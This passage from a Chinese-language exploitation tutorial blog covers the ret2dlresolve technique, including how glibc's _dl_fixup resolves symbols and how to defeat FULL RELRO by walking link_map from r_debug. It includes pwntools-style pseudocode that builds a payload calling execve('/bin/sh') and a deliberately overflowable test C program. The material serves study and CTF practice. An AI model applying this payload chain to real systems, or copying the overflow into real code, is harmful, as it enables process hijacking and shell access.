+<span id="cb24-24"><a href="#cb24-24" aria-hidden="true" tabindex="-1"></a>        result <span class="op">=</span> _dl_lookup_symbol_x<span class="op">(</span>strtab <span class="op">+</span> sym<span class="op">-&gt;</span>st_name<span class="op">,</span> l<span class="op">,</span> <span class="op">&amp;</span>sym<span class="op">,</span> l<span class="op">-&gt;</span>l_scope<span class="op">,</span>  version<span class="op">,</span> ELF_RTYPE_CLASS_PLT<span class="op">,</span> flags<span class="op">,</span> NULL<span class="op">);</span>                                                  </span>
+<span id="cb24-25"><a href="#cb24-25" aria-hidden="true" tabindex="-1"></a>                                                                         </span>
+<span id="cb24-26"><a href="#cb24-26" aria-hidden="true" tabindex="-1"></a>                                                                                           </span>
+<span id="cb24-27"><a href="#cb24-27" aria-hidden="true" tabindex="-1"></a>     <span class="co">/* Currently result contains the base load address (or link map)                       </span></span>
+<span id="cb24-28"><a href="#cb24-28" aria-hidden="true" tabindex="-1"></a><span class="co">     of the object that defines sym.  Now add in the symbol                                 </span></span>
+<span id="cb24-29"><a href="#cb24-29" aria-hidden="true" tabindex="-1"></a><span class="co">     offset.  */</span>                 </span>
+<span id="cb24-30"><a href="#cb24-30" aria-hidden="true" tabindex="-1"></a>        <span class="co">//原本的地址的计算方式</span></span>
+<span id="cb24-31"><a href="#cb24-31" aria-hidden="true" tabindex="-1"></a>         <span class="co">// 基于查询到的 link_map 计算符号的绝对地址: result-&gt;l_addr + sym-&gt;st_value       </span></span>
+<span id="cb24-32"><a href="#cb24-32" aria-hidden="true" tabindex="-1"></a>        <span class="co">// l_addr 为待解析函数所在文件的基地址                                             </span></span>
+<span id="cb24-33"><a href="#cb24-33" aria-hidden="true" tabindex="-1"></a>      value <span class="op">=</span> DL_FIXUP_MAKE_VALUE <span class="op">(</span>result<span class="op">,</span>  sym <span class="op">?</span> <span class="op">(</span>LOOKUP_VALUE_ADDRESS <span class="op">(</span>result<span class="op">)</span>  <span class="op">+</span> sym<span class="op">-&gt;</span>st_value<span class="op">)</span> <span class="op">:</span> <span class="dv">0</span><span class="op">);</span>                                                </span>
+<span id="cb24-34"><a href="#cb24-34" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span>                                                                                       </span>
+<span id="cb24-35"><a href="#cb24-35" aria-hidden="true" tabindex="-1"></a>  <span class="cf">else</span><span class="co">//我们进入到了else分支！                                                                                     </span></span>
+<span id="cb24-36"><a href="#cb24-36" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span>                                                                                       </span>
+<span id="cb24-37"><a href="#cb24-37" aria-hidden="true" tabindex="-1"></a>      <span class="co">/* We already found the symbol.  The module (and therefore its load                   </span></span>
+<span id="cb24-38"><a href="#cb24-38" aria-hidden="true" tabindex="-1"></a><span class="co">     address) is also known.  */</span>   </span>
+<span id="cb24-39"><a href="#cb24-39" aria-hidden="true" tabindex="-1"></a>      <span class="co">// 此时的计算方式与strtab和st_name无关，即不需要函数字符串</span></span>
+<span id="cb24-40"><a href="#cb24-40" aria-hidden="true" tabindex="-1"></a>      value <span class="op">=</span> DL_FIXUP_MAKE_VALUE <span class="op">(</span>l<span class="op">,</span> l<span class="op">-&gt;</span>l_addr <span class="op">+</span> sym<span class="op">-&gt;</span>st_value<span class="op">);</span>                           </span>
+<span id="cb24-41"><a href="#cb24-41" aria-hidden="true" tabindex="-1"></a>      result <span class="op">=</span> l<span class="op">;</span>                                                                           </span>
+<span id="cb24-42"><a href="#cb24-42" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span>                 </span>
+<span id="cb24-43"><a href="#cb24-43" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ......   </span></span>
+<span id="cb24-44"><a href="#cb24-44" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>即我们可以看到，<code>_dl_fixup()</code>函数在<code>if-else</code>分支前仅是读出了<code>strtab</code>和<code>symtab</code>的基址，然后再读出了<code>Elf_Sym</code>结构的数据，
+在进入<code>if</code>分支时我们的函数地址计算方式是需要到函数字符串的，即需要读取字符串偏移。而进入了<code>else</code>分支过后，计算地址的方式发生了变更，不再需要到函数字符串，也就不会再去尝试读取字符串了。</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="co">//=========================  if 分支 ============================</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="co">// 查询待解析符号所在的目标文件的 link_map </span></span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a><span class="co">// 此时需要strtab + sym-&gt;st_name找到函数字符串</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>result <span class="op">=</span> _dl_lookup_symbol_x<span class="op">(</span>strtab <span class="op">+</span> sym<span class="op">-&gt;</span>st_name<span class="op">,</span> l<span class="op">,</span> <span class="op">&amp;</span>sym<span class="op">,</span> l<span class="op">-&gt;</span>l_scope<span class="op">,</span>  version<span class="op">,</span> ELF_RTYPE_CLASS_PLT<span class="op">,</span> flags<span class="op">,</span> NULL<span class="op">);</span>                                                  </span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a>                                                                         </span>
+<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a>             </span>
+<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a><span class="co">//原本的地址的计算方式</span></span>
+<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a><span class="co">// 基于查询到的 link_map 计算符号的绝对地址: result-&gt;l_addr + sym-&gt;st_value       </span></span>
+<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a><span class="co">// l_addr 为待解析函数所在文件的基地址                                             </span></span>
+<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a>value <span class="op">=</span> DL_FIXUP_MAKE_VALUE <span class="op">(</span>result<span class="op">,</span>  sym <span class="op">?</span> <span class="op">(</span>LOOKUP_VALUE_ADDRESS <span class="op">(</span>result<span class="op">)</span>  <span class="op">+</span> sym<span class="op">-&gt;</span>st_value<span class="op">)</span> <span class="op">:</span> <span class="dv">0</span><span class="op">);</span>    </span>
+<span id="cb25-11"><a href="#cb25-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb25-12"><a href="#cb25-12" aria-hidden="true" tabindex="-1"></a><span class="co">//========================= else 分支 ============================</span></span>
+<span id="cb25-13"><a href="#cb25-13" aria-hidden="true" tabindex="-1"></a><span class="co">// 此时的计算方式与strtab和st_name无关，即不需要函数字符串</span></span>
+<span id="cb25-14"><a href="#cb25-14" aria-hidden="true" tabindex="-1"></a>value <span class="op">=</span> DL_FIXUP_MAKE_VALUE <span class="op">(</span>l<span class="op">,</span> l<span class="op">-&gt;</span>l_addr <span class="op">+</span> sym<span class="op">-&gt;</span>st_value<span class="op">);</span>                           </span>
+<span id="cb25-15"><a href="#cb25-15" aria-hidden="true" tabindex="-1"></a>result <span class="op">=</span> l<span class="op">;</span>          </span></code></pre></div>
+<p>所以我们不必担心<code>strtab + st_name</code>到底是什么值，因为在<code>else</code>分支中根本不需要读取，也就不会产生<code>SIGSEGV</code>。</p>
+<p>事实上我们可以不伪造<code>fake_str_entry</code>，即字符串<code>”execve\x00"</code>，而让<code>Elf_Dyn(DT_STRTAB)</code>中的基址指向任意位置均可（甚至是0）。甚至于我们可以让<code>l_info[DT_STRTAB]</code>指向和<code>l_info[DT_JMPREL]</code>或者<code>l_info[DT_SYMTAB]</code>一样的结构体（即结构体共用），则我们连<code>Elf_Dyn(DT_STRTAB)</code>结构体都不需要伪造。上面我的构造代码只是为了整体性可读性而构造了<code>Elf_Dyn(DT_STRTAB)</code>（这并不影响构造出的<code>fake link_map</code>整体大小），读者也可以根据自己的需求来构造适合自己的<code>fake link_map</code>。</p>
+<h5 id="小结-3">2.3.4 小结</h5>
+<ol type="1">
+<li>无输出函数时，我们可以利用GOT表中已解析的函数地址，配合<code>_dl_fixup</code>中的计算方式，解析出我们想要的函数地址；</li>
+<li>此方法虽然可以在无泄漏函数的情况下完成攻击，但是利用条件对比上面提到的方法多了一条——即<strong>需要知道目标系统运行的</strong>
+<code>libc.so</code>;</li>
+<li>仍然需要任意写的能力；</li>
+</ol>
+<h3 id="full_relero">3. FULL_RELERO</h3>
+<h4 id="分析-1">3.1 分析</h4>
+<p>当开启<code>FULL_RELERO</code>时，整个<code>GOT</code>表将标记为<code>read-only</code>，并且所有的外部引用变量/函数都将在程序装载时由动态链接器解析完成，即<code>dl_runtime_resolve</code>函数将无用武之地
+，那么此时<code>.got.plt</code>表中的第二项
+表项<code>GOT[1]</code>装载的<code>link_map</code>地址 以及第二项
+表项<code>GOT[2]</code>装载的<code>dl_runtime_resolve</code>函数地址将是0。</p>
+<p>故而，GOT 表中的这两个地址均为
+0。所以我们没法利用<code>dl_runtime_resolve</code>来解析函数，故而<code>ret2dlresolve</code>方法失效。</p>
+<p><strong>事实上该攻击方法真的失效了吗？</strong></p>
+<h4 id="搜寻丢失的值">3.2 搜寻丢失的值</h4>
+<p>2015年发表在USENIX上的<a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico" target="_blank" rel="noopener">《How
+the ELF Ruined
+Christmas》</a>，向我们介绍了一种即使开了<code>FULL_RELERO</code>也可以进行<code>ret2dlresolve</code>攻击的技术。</p>
+<p>我们知道，此种情况下无法进行<code>ret2dlresolve</code>攻击的关键点在于<code>_dl_runtime_resolve</code>函数地址未知，以及<code>link_map</code>地址也不知道。</p>
+<p>通过<a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico" target="_blank" rel="noopener">该论文</a>
+我们知道，可以通过<code>.dynamic</code>段中的以<code>DT_DEBUG</code>符号为关键字的值，指向了一个叫做<code>r_debug</code>结构体（该值由动态加载器在加载<code>elf</code>时填入，提供给<code>debugger</code>使用），其(64位下)定义如下：</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* offset    |  size */</span>  type <span class="op">=</span> <span class="kw">struct</span> r_debug <span class="op">{</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="co">/*    0      |     4 */</span>    <span class="dt">int</span> r_version<span class="op">;</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="co">/* XXX  4-byte hole  */</span></span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a><span class="co">/*    8      |     8 */</span>    <span class="kw">struct</span> link_map_public <span class="op">*</span>r_map<span class="op">;</span></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a><span class="co">/*   16      |     8 */</span>    Elf64_Addr r_brk<span class="op">;</span></span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a><span class="co">/*   24      |     4 */</span>    <span class="kw">enum</span> <span class="op">{</span>RT_CONSISTENT<span class="op">,</span> RT_ADD<span class="op">,</span> RT_DELETE<span class="op">}</span> r_state<span class="op">;</span></span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a><span class="co">/* XXX  4-byte hole  */</span></span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a><span class="co">/*   32      |     8 */</span>    Elf64_Addr r_ldbase</span></code></pre></div>
+<p>其中<code>r_map</code>字段就是我们要寻找的linkmap的地址。</p>
+<p>那么此时问题只剩一个了——找到<code>_dl_runtime_resolve</code>函数地址。</p>
+<p>该论文给我们的答案是——从别的已加载进程序内存的且没有开<code>FULL RELRO</code>保护的<code>elf</code>的<code>GOT</code>中寻找，虽然有点绕，但这个有这么多形容词修饰的<code>elf</code>文件不就可以是我们喜闻乐见的<code>glibc.so</code>吗？而从上面我们了解的<code>link_map</code>结构来说，结构体内存在<code>l_next</code>和<code>l_prev</code>两个结构体指针可以让我们遍历到所有已加载进来的<code>elf</code>文件的<code>link_map</code>。</p>
+<p>那么我们可以得出寻找的逻辑链如下：</p>
+<ol type="1">
+<li>读取<code>.dynamic</code>段中以<code>DT_DEBUG</code>符号为关键字的值，即得到<code>r_debug</code>的地址；</li>
+<li>从<code>r_debug</code>结构体中读出<code>r_map</code>的值，即<code>link_map</code>地址；</li>
+<li>从<code>link_map</code>结构体中读出的<code>l_next</code>的值，遍历<code>link_map</code>链表；</li>
+<li>读取每个<code>link_map</code>中的<code>l_info[DT_PLTGOT]</code>的值，判断该值是否为0，若不为0则认为是未开启<code>FULL RELRO</code>的<code>so</code>文件，即存在<code>.got.plt</code>表，此时应读出该<code>l_info[DT_PLTGOT]</code>的值，得到该<code>so</code>文件的<code>Elf_Dyn(DT_PLTGOT)</code>结构体的地址；</li>
+<li>从<code>Elf_Dyn(DT_PLTGOT)</code>结构体中读出<code>.got.plt</code>节的基址；</li>
+<li>然后读出第三个表项即<code>.got.plt[2]</code>的值，该值即为<code>_dl_runtime_resolve</code>的地址。</li>
+</ol>
+<div class="sourceCode" id="cb27"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="co">// DT_PLTGOT = 3</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a>r_map <span class="op">=&gt;</span> link_map <span class="op">=&gt;</span> link_map<span class="op">-&gt;</span>l_next <span class="op">=&gt;</span> next_link_map <span class="op">=&gt;</span> l_info<span class="op">[</span>DT_PLTGOT<span class="op">]</span> <span class="op">=&gt;</span> GOT addr <span class="op">=&gt;</span> GOT<span class="op">[</span><span class="dv">2</span><span class="op">](</span>_dl_runtime_resolve<span class="op">)</span></span></code></pre></div>
+<p>那么现在我们重新拥有了<code>link_map</code>地址和<code>dl_runtime_resolve</code>函数地址，我们上述的那几套攻击方式又有用武之地了。</p>
+<h4 id="利用-3">3.3 利用</h4>
+<p>基本流程和2.1节、2.3节差不多，只是多了几步寻找<code>linkmap_addr</code>和<code>_dl_runtime_resolve</code>值的步骤，具体伪代码可以参考下面我写的：</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> find_dl_resolve(linkmap_addr):</span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a>    “”“</span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a>    Traverse the linked <span class="bu">list</span> of linkmap to find _dl_runtime_resolve() addr</span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a>    “”“</span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span>(<span class="dv">1</span>):</span>
+<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a>        linkmap_l_next <span class="op">=</span> linkmap_addr <span class="op">+</span> <span class="dv">24</span></span>
+<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a>        linkmap_addr <span class="op">=</span> leak(linkmap_l_next,<span class="dv">8</span>)</span>
+<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a>        log.info(<span class="st">&quot;linkmap addr:</span><span class="sc">%s</span><span class="st">&quot;</span><span class="op">%</span>(<span class="bu">hex</span>(linkmap_addr)))</span>
+<span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-10"><a href="#cb28-10" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Dyn_PLTGOT Entry Addr</span></span>
+<span id="cb28-11"><a href="#cb28-11" aria-hidden="true" tabindex="-1"></a>        dyn_pltgot_entry_addr <span class="op">=</span> linkmap_addr <span class="op">+</span> <span class="bn">0x40</span> <span class="op">+</span> DT_PLTGOT <span class="op">*</span> <span class="bn">0x8</span></span>
+<span id="cb28-12"><a href="#cb28-12" aria-hidden="true" tabindex="-1"></a>        elf_pltgot_ptr_addr <span class="op">=</span> leak(dyn_pltgot_entry_addr) </span>
+<span id="cb28-13"><a href="#cb28-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-14"><a href="#cb28-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> elf_pltgot_ptr_addr <span class="op">!=</span> <span class="dv">0</span>: <span class="co"># no full relro elf</span></span>
+<span id="cb28-15"><a href="#cb28-15" aria-hidden="true" tabindex="-1"></a>            elf_pltgot_addr <span class="op">=</span> leak(elf_pltgot_ptr_addr <span class="op">+</span> <span class="bn">0x8</span>)</span>
+<span id="cb28-16"><a href="#cb28-16" aria-hidden="true" tabindex="-1"></a>            <span class="co"># GOT[2] = _dl_resolve</span></span>
+<span id="cb28-17"><a href="#cb28-17" aria-hidden="true" tabindex="-1"></a>            got_2_addr<span class="op">=</span> elf_pltgot_addr <span class="op">+</span> <span class="bn">0x8</span> <span class="op">*</span><span class="dv">2</span> </span>
+<span id="cb28-18"><a href="#cb28-18" aria-hidden="true" tabindex="-1"></a>            dl_resolve_addr <span class="op">=</span> leak(got_2_addr) </span>
+<span id="cb28-19"><a href="#cb28-19" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> dl_resolve_addr</span>
+<span id="cb28-20"><a href="#cb28-20" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
+<span id="cb28-21"><a href="#cb28-21" aria-hidden="true" tabindex="-1"></a>            log.info(<span class="st">&quot;This elf is static linked or full relro&quot;</span>)</span>
+<span id="cb28-22"><a href="#cb28-22" aria-hidden="true" tabindex="-1"></a>            log.info(<span class="st">&quot;Continue..&quot;</span>)</span>
+<span id="cb28-23"><a href="#cb28-23" aria-hidden="true" tabindex="-1"></a>            </span>
+<span id="cb28-24"><a href="#cb28-24" aria-hidden="true" tabindex="-1"></a><span class="co"># r_debug</span></span>
+<span id="cb28-25"><a href="#cb28-25" aria-hidden="true" tabindex="-1"></a>r_debug_addr <span class="op">=</span> leak(DT_DEBUG_addr)</span>
+<span id="cb28-26"><a href="#cb28-26" aria-hidden="true" tabindex="-1"></a>r_map_addr <span class="op">=</span> r_debug_addr <span class="op">+</span><span class="bn">0x8</span></span>
+<span id="cb28-27"><a href="#cb28-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-28"><a href="#cb28-28" aria-hidden="true" tabindex="-1"></a><span class="co"># linkmap addr</span></span>
+<span id="cb28-29"><a href="#cb28-29" aria-hidden="true" tabindex="-1"></a>linkmap_addr <span class="op">=</span> leak(r_map_addr)</span>
+<span id="cb28-30"><a href="#cb28-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-31"><a href="#cb28-31" aria-hidden="true" tabindex="-1"></a><span class="co"># find dl_resolve addr</span></span>
+<span id="cb28-32"><a href="#cb28-32" aria-hidden="true" tabindex="-1"></a>dl_resolve_addr <span class="op">=</span> find_dl_resolve(linkmap_addr)</span>
+<span id="cb28-33"><a href="#cb28-33" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-34"><a href="#cb28-34" aria-hidden="true" tabindex="-1"></a><span class="co"># generate dlresolve payload and write to writable_addr</span></span>
+<span id="cb28-35"><a href="#cb28-35" aria-hidden="true" tabindex="-1"></a>dlresolve <span class="op">=</span> Ret2dlresolvePayload(elf,<span class="st">&quot;execve&quot;</span>,args<span class="op">=</span>[],data_addr<span class="op">=</span>writable_addr)</span>
+<span id="cb28-36"><a href="#cb28-36" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-37"><a href="#cb28-37" aria-hidden="true" tabindex="-1"></a>your_write(writable_addr, dlresolve.payload)</span>
+<span id="cb28-38"><a href="#cb28-38" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-39"><a href="#cb28-39" aria-hidden="true" tabindex="-1"></a><span class="co"># prepare args for execve()</span></span>
+<span id="cb28-40"><a href="#cb28-40" aria-hidden="true" tabindex="-1"></a>pass_args(rdi<span class="op">=</span><span class="st">&quot;/bin/sh&quot;</span>,rsi<span class="op">=</span><span class="fl">0.</span><span class="er">rdx</span><span class="op">=</span><span class="dv">0</span>)</span>
+<span id="cb28-41"><a href="#cb28-41" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-42"><a href="#cb28-42" aria-hidden="true" tabindex="-1"></a><span class="co"># triger _dl_runtime_resolve()</span></span>
+<span id="cb28-43"><a href="#cb28-43" aria-hidden="true" tabindex="-1"></a>_dl_runtime_resolve(linkmap_addr, dlreslove.reloc_index)</span></code></pre></div>
+<p>读者们可以自己编译一下源码，测试一下自己是否能在<code>FULL RELRO</code>下进行<code>ret2dlreslove</code>攻击，在此给出测试源码：</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="co">// gcc -no-pie -Wl,-z,now test.c -g -fno-stack-protector -o full_relro</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;unistd.h&gt;</span></span>
+<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(){</span></span>
+<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a>    setbuf<span class="op">(</span>stdin<span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a>    setbuf<span class="op">(</span>stdout<span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a>    setbuf<span class="op">(</span>stderr<span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb29-11"><a href="#cb29-11" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span> s<span class="op">=</span> <span class="st">&quot;FULL RELRO</span><span class="sc">\n\x00</span><span class="st">&quot;</span><span class="op">;</span></span>
+<span id="cb29-12"><a href="#cb29-12" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> buf<span class="op">[</span><span class="dv">16</span><span class="op">];</span></span>
+<span id="cb29-13"><a href="#cb29-13" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb29-14"><a href="#cb29-14" aria-hidden="true" tabindex="-1"></a>    write<span class="op">(</span><span class="dv">1</span><span class="op">,</span>s<span class="op">,</span>strlen<span class="op">(</span>s<span class="op">));</span></span>
+<span id="cb29-15"><a href="#cb29-15" aria-hidden="true" tabindex="-1"></a>    read<span class="op">(</span><span class="dv">0</span><span class="op">,</span>buf<span class="op">,</span><span class="bn">0x100</span><span class="op">);</span></span>
+<span id="cb29-16"><a href="#cb29-16" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb29-17"><a href="#cb29-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<h4 id="小结-4">3.4 小结</h4>
+<p>3.3节的方式需要有任意读写的能力，或者我们可以采用像论文中一样的方式——并没有要求有读的<code>gadgets</code>，但是有要求任意写的能力<code>write memory()</code>和任意指针+偏移写结构体字段<code>deref write()</code>的能力等。</p>
+<p><strong>一般情况下我们很难遇到这么巧的gadget(或者我还没发现怎么发现这些gadget并利用?)</strong></p>
+<p>则一般情况下，如果我们拥有任意读写的能力，我们是可以满足在<code>FULL_RELERO</code>下进行<code>ret2dlresolve</code>攻击的需求的。</p>
+<h4 id="注意事项">3.5 注意事项</h4>
+<p>需要注意的是，虽然我们回到了<code>partial RELRO</code>的思路，但是2.2节仅修改<code>link_map</code>中<code>l_info</code>指针的方法是<strong>不适用的</strong>，因为2.2的方法最后会导致借用的正常函数的<code>GOT</code>会被<code>dl_fixup()</code>改写，</p>
+<p>而<code>FULL_RELERO</code>下的<code>GOT表</code>是只读的，此时将触发<code>SIGSEGV</code>。</p>
+<p>则我们只能用2.1节伪造各类条目或者2.3节伪造l<code>ink_map</code>的方法，此时只需要注意将<code>Elf_Rel</code>的<code>r_offset</code>指向可写的区域即可。</p>
+<h2 id="三.-总结">三. 总结</h2>
+<p>在我们能够使用<code>ROP</code>的情况下：</p>
+<ol type="1">
+<li><p>如果<code>.dynamic</code>段可写，那么改写<code>STRTAB</code>基址即可，如1.节的方法，只需要写的能力；</p></li>
+<li><p>未开启<code>PIE</code>时，2.1节中伪造各条目的方式，32位下只需要写的能力即可，不需要泄露数据，但是64位下需要泄露<code>link_map</code>地址，从而修改<code>l_info[VERSYMIDX(DT_VERSYM)]</code>的值为0；</p></li>
+<li><p>2.2节修改<code>link_map</code>的方法较为简单，适合手动构造，但需要读写能力；</p></li>
+<li><p>在64位无输出函数的极端情况下，可以像2.3节中借用已解析函数的<code>GOT表项</code>并伪造<code>link_map</code>进行攻击，仅需要写的能力；</p></li>
+<li><p>在<code>FULL RELRO</code>的情况下，需要通过读取各类数据结构寻回<code>_dl_runtime_resolve</code>的值以及<code>link_map</code>的值，然后再进行攻击，如3.节中的方式，需要任意读写的能力。当然也可以尝试找到合适的<code>gadget</code>，拥有结构体+偏移值的写的能力就能不需任意读的能力，需要具体情况具体分析。</p></li>
+</ol>
+<h2 id="四.-结尾">四. 结尾</h2>
+<p>由于作者水平有限且文章长度已过万字，难免会出现些纰漏，希望读者阅读时能仔细求证，也希望读者能从中有所收获。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>T3stzer0</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve——从No-RELRO到FULL-RELRO/">https://www.testzero-wz.com/2022/03/05/Ret2dlresolve——从No-RELRO到FULL-RELRO/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tag/pwn/"># pwn</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/11/12/以蓝队视角看HW手法/">以蓝队视角看HW手法</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <!-- 
+<footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+-->
+<script src="/js/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+    </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
